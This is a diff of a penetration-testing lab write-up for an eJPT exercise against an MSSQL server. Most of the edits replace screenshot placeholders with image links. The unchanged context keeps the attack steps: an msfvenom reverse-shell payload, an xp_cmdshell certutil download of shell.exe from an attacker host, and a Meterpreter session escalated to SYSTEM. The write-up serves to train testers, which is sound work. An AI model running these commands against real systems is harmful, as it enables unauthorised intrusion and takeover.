@@ -71,7 +71,7 @@ Port 1433/tcp OPEN — Microsoft SQL Server
 
 💡 **Key Finding:** MSSQL was exposed on its default port (1433), confirming the attack surface.
 
-**[Screenshot: Nmap output showing port 1433 open]**
+![Nmap_Scan](https://github.com/Abin-2820/Host-and-network-penTesting_eJPT-MSSQL-AlternativePath/blob/d93ac3b2cbf7bb2c0338349e73377f21f3d92b19/Screenshots/1%20-%20Screenshot%202026-02-12%20133648.png)
 
 ---
 
@@ -106,7 +106,9 @@ run
 
 **Vulnerability:** Default/weak credentials on SQL Server administrative accounts.
 
-**[Screenshot: Metasploit MSSQL login success]**
+![Brute_Force](https://github.com/Abin-2820/Host-and-network-penTesting_eJPT-MSSQL-AlternativePath/blob/d93ac3b2cbf7bb2c0338349e73377f21f3d92b19/Screenshots/2%20-%20Screenshot%202026-02-12%20133758.png)
+![Brute_Force](https://github.com/Abin-2820/Host-and-network-penTesting_eJPT-MSSQL-AlternativePath/blob/d93ac3b2cbf7bb2c0338349e73377f21f3d92b19/Screenshots/3%20-%20Screenshot%202026-02-12%20133954.png)
+![Brute_force](https://github.com/Abin-2820/Host-and-network-penTesting_eJPT-MSSQL-AlternativePath/blob/d93ac3b2cbf7bb2c0338349e73377f21f3d92b19/Screenshots/4%20-%20Screenshot%202026-02-12%20134024.png)
 
 ---
 
@@ -131,7 +133,8 @@ When prompted for password, enter the password obtained from Step 2.
 
 💡 **Key Finding:** Direct MSSQL client authentication bypasses the need for exploitation modules, offering direct SQL command execution.
 
-**[Screenshot: Impacket MSSQL client authenticated]**
+![Impacket](https://github.com/Abin-2820/Host-and-network-penTesting_eJPT-MSSQL-AlternativePath/blob/d93ac3b2cbf7bb2c0338349e73377f21f3d92b19/Screenshots/5%20-%20Screenshot%202026-02-12%20134117.png)
+
 
 ---
 
@@ -162,8 +165,9 @@ FLAG1.txt located in C:\
 
 💡 **Critical Finding:** `xp_cmdshell` was enabled, allowing arbitrary OS command execution. This is a **CVSS 9.8 (Critical)** vulnerability.
 
-**[Screenshot: xp_cmdshell executing systeminfo]**
-**[Screenshot: Directory listing showing FLAG1.txt]**
+![Command_Shell](https://github.com/Abin-2820/Host-and-network-penTesting_eJPT-MSSQL-AlternativePath/blob/d93ac3b2cbf7bb2c0338349e73377f21f3d92b19/Screenshots/6%20-%20Screenshot%202026-02-12%20134131.png)
+![Command_Shell](https://github.com/Abin-2820/Host-and-network-penTesting_eJPT-MSSQL-AlternativePath/blob/d93ac3b2cbf7bb2c0338349e73377f21f3d92b19/Screenshots/7%20-%20Screenshot%202026-02-12%20134227.png)
+![Command_Shell_Flag](https://github.com/Abin-2820/Host-and-network-penTesting_eJPT-MSSQL-AlternativePath/blob/d93ac3b2cbf7bb2c0338349e73377f21f3d92b19/Screenshots/8%20-%20Screenshot%202026-02-12%20134250.png)
 
 **FLAG 1 Retrieved.**
 
@@ -191,7 +195,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=4444 -f ex
 
 **Result:** `shell.exe` created locally on the attacking machine.
 
-**[Screenshot: msfvenom payload generation]**
+![Meterpreter](https://github.com/Abin-2820/Host-and-network-penTesting_eJPT-MSSQL-AlternativePath/blob/d93ac3b2cbf7bb2c0338349e73377f21f3d92b19/Screenshots/9%20-%20Screenshot%202026-02-12%20134444.png)
 
 ---
 
@@ -201,7 +205,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=4444 -f ex
 ```sql
 xp_cmdshell "certutil -urlcache -f http://<attacker-ip>:8000/shell.exe shell.exe"
 ```
-
+![Failed](https://github.com/Abin-2820/Host-and-network-penTesting_eJPT-MSSQL-AlternativePath/blob/d93ac3b2cbf7bb2c0338349e73377f21f3d92b19/Screenshots/10%20-%20Screenshot%202026-02-12%20134711.png)
 **Error:** Access denied. The current MSSQL service context (typically NETWORK SERVICE) lacks write permissions in the default directory.
 
 **Second Attempt (Success):**
@@ -210,7 +214,7 @@ Create a writable directory first:
 ```sql
 xp_cmdshell "mkdir C:\Temp"
 ```
-
+![Temp](https://github.com/Abin-2820/Host-and-network-penTesting_eJPT-MSSQL-AlternativePath/blob/d93ac3b2cbf7bb2c0338349e73377f21f3d92b19/Screenshots/11%20-%20Screenshot%202026-02-12%20134722.png)
 Then transfer to the writable location:
 ```sql
 xp_cmdshell "certutil -urlcache -f http://<attacker-ip>:8000/shell.exe C:\Temp\shell.exe"
@@ -223,7 +227,7 @@ xp_cmdshell "certutil -urlcache -f http://<attacker-ip>:8000/shell.exe C:\Temp\s
 
 💡 **Key Learning:** Understanding file system permissions and service contexts is crucial. The MSSQL service runs under a specific user account with limited privileges — exploitation must account for this.
 
-**[Screenshot: certutil file transfer command]**
+![Success](https://github.com/Abin-2820/Host-and-network-penTesting_eJPT-MSSQL-AlternativePath/blob/d93ac3b2cbf7bb2c0338349e73377f21f3d92b19/Screenshots/12%20-%20Screenshot%202026-02-12%20134802.png)
 
 ---
 
@@ -238,12 +242,12 @@ set LHOST <attacker-ip>
 set LPORT 4444
 run
 ```
-
+![Payload_Setup](https://github.com/Abin-2820/Host-and-network-penTesting_eJPT-MSSQL-AlternativePath/blob/d93ac3b2cbf7bb2c0338349e73377f21f3d92b19/Screenshots/13%20-%20Screenshot%202026-02-12%20134939.png)
 **On Target Machine — Execute Payload:**
 ```sql
 xp_cmdshell "C:\Temp\shell.exe"
 ```
-
+![Running](https://github.com/Abin-2820/Host-and-network-penTesting_eJPT-MSSQL-AlternativePath/blob/d93ac3b2cbf7bb2c0338349e73377f21f3d92b19/Screenshots/14%20-%20Screenshot%202026-02-12%20135026.png)
 **Result:**
 ```
 [*] Meterpreter session opened (192.168.x.x:4444 -> 192.168.x.x:random-port)
@@ -252,7 +256,7 @@ meterpreter >
 
 💡 **Milestone:** You now have an interactive Meterpreter shell with the privileges of the MSSQL service account.
 
-**[Screenshot: Meterpreter session established]**
+![Payload_Success](https://github.com/Abin-2820/Host-and-network-penTesting_eJPT-MSSQL-AlternativePath/blob/d93ac3b2cbf7bb2c0338349e73377f21f3d92b19/Screenshots/15%20-%20Screenshot%202026-02-12%20135034.png)
 
 ---
 
@@ -272,7 +276,7 @@ Server username: WORKSTATION\MSSQL_SERVICE_ACCOUNT
 
 💡 **Analysis:** The MSSQL service runs under a service account with limited privileges. Privilege escalation is necessary to access protected system areas (like registry, System32\config).
 
-**[Screenshot: getuid output]**
+![Config](https://github.com/Abin-2820/Host-and-network-penTesting_eJPT-MSSQL-AlternativePath/blob/d93ac3b2cbf7bb2c0338349e73377f21f3d92b19/Screenshots/17%20-%20Screenshot%202026-02-12%20135201.png)
 
 ---
 
@@ -307,7 +311,7 @@ Meterpreter automatically uses available privilege escalation techniques (such a
 ```
 [+] Privilege escalated to: NT AUTHORITY\SYSTEM
 ```
-
+![Privilege_Escalation](https://github.com/Abin-2820/Host-and-network-penTesting_eJPT-MSSQL-AlternativePath/blob/d93ac3b2cbf7bb2c0338349e73377f21f3d92b19/Screenshots/19%20-%20Screenshot%202026-02-12%20135224.png)
 **Verification:**
 ```bash
 getuid
@@ -320,8 +324,8 @@ Server username: NT AUTHORITY\SYSTEM
 
 💡 **Milestone:** You now have full system-level privileges.
 
-**[Screenshot: getprivs output showing SeImpersonatePrivilege]**
-**[Screenshot: getsystem execution and SYSTEM context]**
+![NT_AUTORITY](https://github.com/Abin-2820/Host-and-network-penTesting_eJPT-MSSQL-AlternativePath/blob/d93ac3b2cbf7bb2c0338349e73377f21f3d92b19/Screenshots/20%20-%20Screenshot%202026-02-12%20135239.png)
+![NT_AUTORITY](https://github.com/Abin-2820/Host-and-network-penTesting_eJPT-MSSQL-AlternativePath/blob/d93ac3b2cbf7bb2c0338349e73377f21f3d92b19/Screenshots/21%20-%20Screenshot%202026-02-12%20135323.png)
 
 ---
 
@@ -338,10 +342,9 @@ cat C:\Windows\System32\config\SAM
 
 **Error:** Access denied. The SAM hive is protected even from admin service accounts.
 
-**[Screenshot: Access denied error]**
-
 ---
-
+![Access_Deniad](https://github.com/Abin-2820/Host-and-network-penTesting_eJPT-MSSQL-AlternativePath/blob/d93ac3b2cbf7bb2c0338349e73377f21f3d92b19/Screenshots/22%20-%20Screenshot%202026-02-12%20135337.png)
+![Found](https://github.com/Abin-2820/Host-and-network-penTesting_eJPT-MSSQL-AlternativePath/blob/d93ac3b2cbf7bb2c0338349e73377f21f3d92b19/Screenshots/23%20-%20Screenshot%202026-02-12%20135440.png)
 #### **Post-Escalation Access**
 
 After escalation to SYSTEM:
@@ -369,13 +372,7 @@ Reading the file:
 cat C:\Windows\System32\EscalatePrivilegeToGetThisFlag.txt
 ```
 
-**FLAG 3 Retrieved.**
-
 💡 **Key Learning:** The file naming convention is a hint — privilege escalation was required to access this flag. This teaches that enumeration should guide exploitation direction.
-
-**[Screenshot: Directory listing of System32\config]**
-**[Screenshot: Flag search results]**
-**[Screenshot: FLAG2.txt and FLAG3.txt contents]**
 
 ---
 
@@ -402,8 +399,7 @@ cat C:\Users\Administrator\Desktop\FLAG4.txt
 
 **FLAG 4 Retrieved.**
 
-**[Screenshot: Administrator Desktop directory]**
-**[Screenshot: FLAG4.txt contents]**
+![Final_Flag](https://github.com/Abin-2820/Host-and-network-penTesting_eJPT-MSSQL-AlternativePath/blob/d93ac3b2cbf7bb2c0338349e73377f21f3d92b19/Screenshots/24%20-%20Screenshot%202026-02-12%20135755.png)
 
 ---
 
@@ -434,42 +430,8 @@ cat C:\Users\Administrator\Desktop\FLAG4.txt
 ✅ **Tools beyond the course are valuable** — Impacket wasn't covered in eJPT material, but exploring it independently proved invaluable.
 
 ---
-
-## 🔗 References & Techniques
-
-| Technique | MITRE ATT&CK Mapping |
-|-----------|---------------------|
-| Initial access via valid credentials | [T1199 — Trusted Relationship](https://attack.mitre.org/techniques/T1199/) |
-| Command execution via SQL stored procedures | [T1059 — Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/) |
-| Privilege escalation via token impersonation | [T1134.003 — Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/003/) |
-| Credential access via brute force | [T1110.001 — Brute Force: Password](https://attack.mitre.org/techniques/T1110/001/) |
-
----
-
-## 📸 Screenshots
-
-[Add screenshots here as you progress through the walkthrough]
-
-1. Nmap enumeration
-2. MSSQL login successful
-3. Impacket authentication
-4. xp_cmdshell execution
-5. FLAG1 retrieval
-6. Payload generation
-7. File transfer
-8. Meterpreter session
-9. Privilege escalation
-10. SYSTEM context
-11. Flag retrieval (2, 3, 4)
-
----
-
 ## 👤 Author
 
 **Abin Watson**  
 Penetration Tester | eJPT Certified  
 Specialising in Networks, Hosts, Endpoints & Web Applications
-
----
-
-> *"The difference between a script kiddie and a penetration tester is understanding WHY the attack worked — not just HOW to execute it."*
